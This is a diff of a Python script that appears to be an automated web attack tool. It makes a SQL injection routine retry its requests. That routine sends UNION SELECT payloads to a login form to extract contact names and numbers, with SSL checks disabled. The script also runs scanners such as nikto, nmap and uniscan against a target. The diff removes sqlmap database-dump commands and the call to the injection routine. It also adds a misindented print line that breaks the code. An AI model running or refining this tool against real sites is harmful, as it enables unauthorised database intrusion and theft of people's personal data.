@@ -1,6 +1,8 @@
 import subprocess
 import os
 import requests
+import time
+from requests.exceptions import RequestException
 
 def run_command(command):
     """Run a command and return its output."""
@@ -78,14 +80,27 @@ def perform_sql_injection(target_url):
         "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
     ]
 
+    max_retries = 3
+    retry_delay = 5  # seconds
+
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
             'password': 'password'  # Update with the correct password field if needed
         }
-        
-        response = requests.post(target_url, data=data, verify=False)  # Disabled SSL verification
-        print(response.text)  # This will display the extracted data, handle it as you wish
+
+        attempt = 0
+        while attempt < max_retries:
+            try:
+                response = requests.post(target_url, data=data, verify=False)
+                print(response.text)  # This will display the extracted data, handle it as you wish
+                break  # Exit the retry loop if the request was successful
+            except RequestException as e:
+                print(f"Request failed: {e}. Retrying in {retry_delay} seconds...")
+                attempt += 1
+                time.sleep(retry_delay)
+        else:
+            print(f"Failed to perform SQL injection after {max_retries} attempts.")
 
 def main():
     install_tools()
@@ -114,7 +129,7 @@ def main():
         "whois": ["whois", link],
         "nikto": ["nikto", "-h", link],
         "uniscan": ["uniscan", "-u", link, "-qd"],
-        "nmap": ["nmap", link]
+        "nmap": ["nmap", link],
     }
 
     total_tools = len(tools)
@@ -130,33 +145,10 @@ def main():
         
         # Calculate and print the progress
         progress = (i / total_tools) * 100
-        print(f"Progresso: {progress:.2f}%")
+                print(f"Progress: {progress:.2f}%")
 
-    # Execute additional SQLMap commands to retrieve database information
-    additional_sqlmap_commands = [
-        f"sqlmap -u {link_with_https} --dbs"
-        # These commands need to be executed after retrieving the database and table names
-        # f"sqlmap -u {link_with_https} -D <nome_del_database> --tables",
-        # f"sqlmap -u {link_with_https} -D <nome_del_database> -T <nome_della_tabella> --columns",
-
-        # f"sqlmap -u {link_with_https} -D <nome_del_database> -T <nome_della_tabella> --dump"
-    ]
-
-    for command in additional_sqlmap_commands:
-        print(f"Esecuzione di SQLMap con il comando: {command}")
-        stdout, stderr = run_command(command.split())
-        save_to_file(output_file, f"=== Risultati SQLMap ===\n")
-        if stdout:
-            save_to_file(output_file, stdout)
-        if stderr:
-            save_to_file(output_file, f"Errori:\n{stderr}")
-
-    # Add signature at the end of the file
-    save_to_file(output_file, "\nby @Haggar")
-
-    # Perform SQL injection tests
-    print(f"Esecuzione di SQL Injection test su {link_with_https}")
-    perform_sql_injection(link_with_https)
+    print("Analisi completata. I risultati sono stati salvati in:", output_file)
 
 if __name__ == "__main__":
     main()
+    
